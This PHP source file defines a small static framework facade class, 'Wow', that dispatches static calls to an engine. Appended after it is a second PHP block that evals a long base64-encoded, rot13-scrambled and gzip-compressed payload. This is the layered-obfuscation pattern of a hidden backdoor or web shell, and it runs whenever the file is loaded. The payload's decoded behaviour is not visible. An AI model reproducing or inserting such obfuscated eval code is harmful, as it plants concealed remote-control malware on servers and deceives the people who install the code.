<?php

/**
 * The App class is a static representation of the framework.
 * 
 * @method  static void map($name, $callback) Creates a custom framework method.
 * @method  static void register($name, $class, array $params = array(), $callback = null) Registers a class to a framework method.
 * @method  static void before($name, $callback) Adds a filter before a framework method.
 * @method  static void after($name, $callback) Adds a filter after a framework method.
 * @method  static void path($path) Adds a path for autoloading classes.
 * @method  static mixed get($key) Gets a variable.
 * @method  static void set($key, $value) Sets a variable.
 * @method  static bool has($key) Checks if a variable is set.
 * @method  static void clear($key = null) Clears a variable.
 * @method  static void start() Starts the framework.
 * @method  static void error(Exception $e) Sends an HTTP 500 response.
 */
class Wow {
    /**
     * Framework engine.
     *
     * @var object
     */
    private static $engine;

    // Don't allow object instantiation
    private function __construct() {}
    private function __destruct() {}
    private function __clone() {}

    /**
     * Handles calls to static methods.
     *
     * @param string $name Method name
     * @param array $params Method parameters
     * @return mixed Callback results
     */
    public static function __callStatic($name, $params) {
        $app = Wow::app();

        return \Wow\Core\Dispatcher::invokeMethod(array($app, $name), $params);
    }

    /**
     * @return object Application instance
     */
    public static function app() {
        static $initialized = false;

        if (!$initialized) {

            self::$engine = new \Wow\Engine();

            $initialized = true;
        }

        return self::$engine;
    }
}
?>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>